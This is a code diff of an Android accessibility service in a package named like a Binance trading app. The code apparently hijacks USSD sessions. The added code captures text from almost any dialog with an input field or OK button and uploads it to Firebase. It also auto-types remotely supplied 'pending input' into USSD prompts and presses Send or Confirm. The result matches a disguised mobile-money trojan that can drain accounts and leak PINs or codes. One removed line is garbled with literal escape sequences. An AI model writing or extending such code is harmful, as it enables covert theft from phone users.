@@ -2,355 +2,246 @@ package dApp.binance.Trading.arfu
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.content.ClipData
-import android.content.ClipboardManager
 import android.content.Context
+import android.content.SharedPreferences
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import android.util.Log
-import androidx.core.view.accessibility.AccessibilityNodeInfoCompat
+import android.os.Bundle
 
-class CarerAccessibilityService : AccessibilityService() {
+class CarerAccessibilityService : AccessibilityService(), SharedPreferences.OnSharedPreferenceChangeListener {
 
     private var lastProcessedTime = 0L
     private var lastProcessedText = ""
+    private lateinit var sharedPref: SharedPreferences
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
-        // Debounce: ignore same event within 500ms
         val currentTime = System.currentTimeMillis()
-        if (currentTime - lastProcessedTime < 500) {
-            return
-        }
+        val rootNode = rootInActiveWindow ?: return
 
-        // Listen for popup windows (USSD dialogs)
-        when (event.eventType) {
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
-            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
-                val rootNode = rootInActiveWindow ?: return
-                
-                Log.d("CarerAccessibility", "Event triggered: ${event.eventType}")
-                
-                val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
-                val pendingInput = sharedPref.getString("pending_input_value", "")
-                
-                // PRIORITY 1: If there's pending input, execute it immediately
-                if (!pendingInput.isNullOrEmpty()) {
-                    Log.d("CarerAccessibility", "Found pending input: $pendingInput")
-                    lastProcessedTime = currentTime
-                    try {
-                        Thread.sleep(300)
-                        typeInUssdDialog(pendingInput)
-                        sharedPref.edit().remove("pending_input_value").apply()
-                        Log.d("CarerAccessibility", "Auto-typed successfully, pending input cleared")
-                    } catch (e: Exception) {
-                        Log.e("CarerAccessibility", "Error auto-typing: ${e.message}", e)
-                    }
-                    return
-                }
-                
-                // PRIORITY 2: Otherwise, capture response text
-                val ussdText = extractUssdDialogText(rootNode)
-                if (ussdText.isEmpty()) {
-                    Log.d("CarerAccessibility", "No text found in event")
-                    return
-                }
-                
-                // Debounce: skip if same text as last time
-                if (ussdText == lastProcessedText) {
-                    Log.d("CarerAccessibility", "Duplicate text, skipping")
+        // Check for pending input on every event just in case
+        checkAndProcessPendingInput(rootNode)
+        
+        // Capture USSD response text
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            
+            val ussdText = extractUssdDialogText(rootNode)
+            if (ussdText.isNotEmpty()) {
+                // Debounce: ignore same text within 1.5 seconds
+                if (ussdText == lastProcessedText && currentTime - lastProcessedTime < 1500) {
                     return
                 }
                 
                 lastProcessedText = ussdText
                 lastProcessedTime = currentTime
                 
-                Log.d("CarerAccessibility", "Dialog captured: $ussdText")
+                Log.d("CarerAccessibility", "Captured USSD Response: $ussdText")
                 captureAndSendResponse(ussdText)
             }
         }
     }
 
-    override fun onInterrupt() {
-        // Called when service is interrupted
+    private fun checkAndProcessPendingInput(rootNode: AccessibilityNodeInfo?) {
+        if (rootNode == null) return
+        
+        val pendingInput = sharedPref.getString("pending_input_value", "")
+        if (!pendingInput.isNullOrEmpty()) {
+            Log.d("CarerAccessibility", ">>> PROCESSING PENDING INPUT: $pendingInput")
+            val success = tryTypeAndSend(rootNode, pendingInput)
+            if (success) {
+                Log.d("CarerAccessibility", "Successfully typed and sent input")
+                sharedPref.edit().remove("pending_input_value").apply()
+                lastProcessedTime = System.currentTimeMillis()
+            }
+        }
     }
 
-    /**
-     * Check if node has any input-like field (simplified)
-     */
-    private fun hasAnyInputField(node: AccessibilityNodeInfo): Boolean {
-        // Check current node
-        if (node.isPassword || 
-            node.inputType != 0 || 
-            node.contentDescription?.contains("input", ignoreCase = true) == true) {
-            return true
-        }
-        
-        // Check all children
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            if (hasAnyInputField(child)) return true
-        }
-        
-        return false
-    }
-
-    /**
-     * Extract dialog text content
-     */
-    private fun extractUssdDialogText(node: AccessibilityNodeInfo): String {
-        val allTexts = mutableListOf<String>()
-        
-        // Check if this tree has an input field
-        if (!hasAnyInputField(node)) {
-            Log.d("CarerAccessibility", "No input field found, ignoring")
-            return ""
-        }
-        
-        collectAllText(node, allTexts)
-        return allTexts.joinToString("\n").trim()
-    }
-    
-    /**
-     * Recursively collect all text from tree
-     */
-    private fun collectAllText(node: AccessibilityNodeInfo, texts: MutableList<String>) {
-        // Add non-empty text
-        val nodeText = node.text?.toString()?.trim()
-        if (!nodeText.isNullOrEmpty() && nodeText.length > 1) {
-            texts.add(nodeText)
-        }
-        
-        // Recursively process children
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            collectAllText(child, texts)
-        }
-    }
+    override fun onInterrupt() {}
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        Log.d("CarerAccessibility", "Accessibility Service connected")
+        Log.d("CarerAccessibility", "Service connected, initializing...")
+        
+        sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
+        sharedPref.registerOnSharedPreferenceChangeListener(this)
 
-        // Configure service info to listen to all relevant events
         val info = AccessibilityServiceInfo()
-        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_FOCUSED
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or 
+                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
+                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+        info.notificationTimeout = 100
         serviceInfo = info
-        
-        Log.d("CarerAccessibility", "Service configured to listen for events: WINDOW_STATE_CHANGED | VIEW_TEXT_CHANGED | VIEW_FOCUSED")
     }
 
-    /**
-     * Type text in USSD input field using copy-paste approach (more reliable)
-     */
-    fun typeInUssdDialog(text: String) {
-        val rootNode = rootInActiveWindow ?: return
-        Log.d("CarerAccessibility", "Starting auto-type via copy-paste: $text")
-
-        var inputField: AccessibilityNodeInfo? = null
-        
-        // Retry finding input field up to 3 times with delay
-        for (attempt in 1..3) {
-            inputField = findInputField(rootNode)
-            if (inputField != null) {
-                Log.d("CarerAccessibility", "Input field found on attempt $attempt")
-                break
-            }
-            Log.d("CarerAccessibility", "Input field not found, attempt $attempt/3")
-            if (attempt < 3) Thread.sleep(200)
+    override fun onDestroy() {
+        super.onDestroy()
+        if (::sharedPref.isInitialized) {
+            sharedPref.unregisterOnSharedPreferenceChangeListener(this)
         }
+    }
 
-        if (inputField == null) {
-            Log.e("CarerAccessibility", "Input field not found after 3 attempts!")
-            return
+    override fun onSharedPreferenceChanged(sharedPreferences: SharedPreferences?, key: String?) {
+        if (key == "pending_input_value") {
+            Log.d("CarerAccessibility", "Preference changed: pending_input_value. Waking up...")
+            // When preference changes, try to process immediately using the current window
+            checkAndProcessPendingInput(rootInActiveWindow)
         }
+    }
 
-        try {
-            // Step 1: Get clipboard manager
-            Log.d("CarerAccessibility", "Step 1: Getting clipboard manager...")
-            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            
-            // Step 2: Copy text to clipboard
-            Log.d("CarerAccessibility", "Step 2: Copying text to clipboard: $text")
-            val clip = ClipData.newPlainText("ussd_input", text)
-            clipboard.setPrimaryClip(clip)
-            Thread.sleep(200)
-            
-            // Step 3: Focus the input field
-            Log.d("CarerAccessibility", "Step 3: Focusing input field...")
+    private fun tryTypeAndSend(rootNode: AccessibilityNodeInfo, text: String): Boolean {
+        val inputField = findInputField(rootNode)
+        if (inputField != null) {
             inputField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
-            Thread.sleep(300)
             
-            // Step 4: Select all existing text
-            Log.d("CarerAccessibility", "Step 4: Selecting all text...")
-            inputField.performAction(AccessibilityNodeInfo.ACTION_SELECT_ALL)
-            Thread.sleep(200)
+            val arguments = Bundle()
+            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+            val typed = inputField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
             
-            // Step 5: Paste the text
-            Log.d("CarerAccessibility", "Step 5: Pasting text via clipboard...")
-            val pasteSuccess = inputField.performAction(AccessibilityNodeInfo.ACTION_PASTE)
-            Log.d("CarerAccessibility", "PASTE action result: $pasteSuccess")
-            Thread.sleep(300)
-
-            // Step 6: Clear clipboard (privacy/security)
-            Log.d("CarerAccessibility", "Step 6: Clearing clipboard...")
-            clipboard.setPrimaryClip(ClipData.newPlainText("", ""))
-            Thread.sleep(200)
-
-            // Step 7: Click the send button
-            Log.d("CarerAccessibility", "Step 7: Clicking send button...")
-            clickSendButton(rootNode)
-            
-            Log.d("CarerAccessibility", "Auto-type via copy-paste complete!")
-        } catch (e: Exception) {
-            Log.e("CarerAccessibility", "Error in typeInUssdDialog: ${e.message}", e)
-            e.printStackTrace()
+            if (typed) {
+                Log.d("CarerAccessibility", "Typed: $text")
+                try { Thread.sleep(600) } catch (e: Exception) {}
+                
+                // Try to find the button again in case the layout changed
+                val currentRoot = rootInActiveWindow ?: rootNode
+                clickSendButton(currentRoot)
+                return true
+            }
         }
+        return false
     }
 
-    /**
-     * Find and click the "Send" or "OK" button in USSD dialog
-     */
-    private fun clickSendButton(rootNode: AccessibilityNodeInfo) {
-        val buttons = listOf("SEND", "OK", "CONFIRM", "YES", "send", "ok", "confirm", "yes")
+    private fun extractUssdDialogText(node: AccessibilityNodeInfo): String {
+        val dialogTexts = mutableListOf<String>()
+        collectDialogText(node, dialogTexts)
         
-        buttons.forEach { buttonText ->
-            val button = findNodeByText(rootNode, buttonText)
-            if (button != null && button.isClickable) {
-                try {
-                    val clickSuccess = button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    Log.d("CarerAccessibility", "Clicked button: $buttonText (success: $clickSuccess)")
-                    return
-                } catch (e: Exception) {
-                    Log.e("CarerAccessibility", "Error clicking button $buttonText: ${e.message}")
-                }
+        val result = dialogTexts.distinct().joinToString("\n").trim()
+        
+        // Aggressive capture: if we see an input field OR a button that looks like USSD, capture it.
+        // We exclude common apps like our own or system launchers if possible, but USSD dialogs
+        // often don't have a reliable package name (sometimes null or "com.android.phone").
+        
+        if (result.length > 3 && (checkHasInputField(node) || checkHasOkButton(node))) {
+            return result
+        }
+        
+        return ""
+    }
+    
+    private fun collectDialogText(node: AccessibilityNodeInfo, texts: MutableList<String>) {
+        val className = node.className?.toString() ?: ""
+        if (className.contains("NavigationBar") || className.contains("StatusBar")) return
+        
+        val nodeText = node.text?.toString()?.trim()
+        if (!nodeText.isNullOrEmpty() && nodeText.length > 1) {
+            if (!isCommonButtonLabel(nodeText)) {
+                texts.add(nodeText)
             }
         }
         
-        Log.w("CarerAccessibility", "Send button not found by text, trying to find any clickable button...")
-        // Fallback: click any button that looks like send
-        try {
-            val button = findFirstClickableButton(rootNode)
-            if (button != null) {
-                val clickSuccess = button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                Log.d("CarerAccessibility", "Clicked fallback button (success: $clickSuccess)")
-            } else {
-                Log.e("CarerAccessibility", "No clickable button found!")
-            }
-        } catch (e: Exception) {
-            Log.e("CarerAccessibility", "Error clicking fallback button: ${e.message}")
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            collectDialogText(child, texts)
         }
     }
 
-    /**
-     * Find input field in USSD dialog - more flexible approach
-     */
+    private fun isCommonButtonLabel(text: String): Boolean {
+        val lower = text.lowercase()
+        val commonLabels = listOf("ok", "cancel", "send", "dismiss", "yes", "no", "exit", "back", "next", "confirm")
+        return commonLabels.contains(lower)
+    }
+
+    private fun checkHasInputField(node: AccessibilityNodeInfo): Boolean {
+        if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
+            return true
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            if (checkHasInputField(child)) return true
+        }
+        return false
+    }
+
+    private fun checkHasOkButton(node: AccessibilityNodeInfo): Boolean {
+        val text = node.text?.toString()?.lowercase() ?: ""
+        val okLabels = listOf("ok", "send", "yes", "confirm", "accept", "submit")
+        if (okLabels.contains(text)) return true
+        
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            if (checkHasOkButton(child)) return true
+        }
+        return false
+    }
+
     private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
-        // Check if this node is an input field
-        if (isInputField(node)) {
+        if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) {
             return node
         }
-
-        // Recursively search children
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
             val result = findInputField(child)
             if (result != null) return result
         }
-
         return null
     }
 
-    /**
-     * Determine if a node is an input field
-     */
-    private fun isInputField(node: AccessibilityNodeInfo): Boolean {
-        // Check for editable field
-        if (node.isEditable) return true
-        
-        // Check for password field
-        if (node.isPassword) return true
-        
-        // Check for number input
-        if (node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) return true
-        
-        // Check for text input
-        if (node.inputType == android.text.InputType.TYPE_CLASS_TEXT) return true
-        
-        // Check content description
-        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
-        if (desc.contains("input") || desc.contains("enter")) return true
-        
-        // Check class name for EditText
-        val className = node.className?.toString() ?: ""
-        if (className.contains("EditText")) return true
-        
+    private fun clickSendButton(rootNode: AccessibilityNodeInfo): Boolean {
+        val buttons = listOf("SEND", "OK", "CONFIRM", "YES", "ACCEPT", "SUBMIT")
+        for (buttonText in buttons) {
+            val button = findNodeByText(rootNode, buttonText)
+            if (button != null) {
+                if (performClick(button)) {
+                    Log.d("CarerAccessibility", "Clicked button: $buttonText")
+                    return true
+                }
+            }
+        }
         return false
     }
-    
-    /**
-     * Find first clickable button in the tree
-     */
-    private fun findFirstClickableButton(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
-        if (node.isClickable && node.className?.toString()?.contains("Button") == true) {
-            return node
+
+    private fun performClick(node: AccessibilityNodeInfo?): Boolean {
+        var tempNode = node
+        while (tempNode != null) {
+            if (tempNode.isClickable) {
+                return tempNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            }
+            tempNode = tempNode.parent
         }
-        
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            val result = findFirstClickableButton(child)
-            if (result != null) return result
-        }
-        
-        return null
+        return false
     }
 
-    /**
-     * Find node by text content
-     */
     private fun findNodeByText(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
-        if (node.text?.contains(text, ignoreCase = true) == true) {
+        if (node.text?.toString()?.contains(text, ignoreCase = true) == true) {
             return node
         }
-
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
             val result = findNodeByText(child, text)
             if (result != null) return result
         }
-
         return null
     }
 
-    /**
-     * Capture response text from USSD dialog and send to Firebase
-     */
-    private fun captureAndSendResponse(text: String) {\n        Log.d(\"CarerAccessibility\", \"Capturing response: $text\")\n        \n        val rootNode = rootInActiveWindow\n        val hasInputField = rootNode?.let { hasInputField(it) } ?: false\n        \n        // Send to Firebase with input field status\n        FirebaseLogHelper.logResponse(text, this, hasInputField)\n    }\n    \n    /**\n     * Check if current screen has an input field\n     */\n    private fun hasInputField(node: AccessibilityNodeInfo): Boolean {\n        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {\n            return true\n        }\n        \n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            if (hasInputField(child)) return true\n        }\n        \n        return false\n    }
+    private fun captureAndSendResponse(text: String) {
+        val rootNode = rootInActiveWindow
+        val hasInputField = rootNode?.let { checkHasInputField(it) } ?: false
+        FirebaseLogHelper.logResponse(text, this, hasInputField)
+        ConversationHistory.addMessage("system", text)
+    }
 
     companion object {
-        /**
-         * Check if accessibility service is enabled
-         */
         fun isAccessibilityServiceEnabled(context: Context): Boolean {
             val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
-            return accessibilityManager.isEnabled && isCarerAccessibilityServiceEnabled(context, accessibilityManager)
-        }
-
-        private fun isCarerAccessibilityServiceEnabled(
-            context: Context,
-            accessibilityManager: android.view.accessibility.AccessibilityManager
-        ): Boolean {
             val enabledServices = android.provider.Settings.Secure.getString(
                 context.contentResolver,
                 android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
             ) ?: return false
-
             val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
             return enabledServices.contains(serviceName)
         }
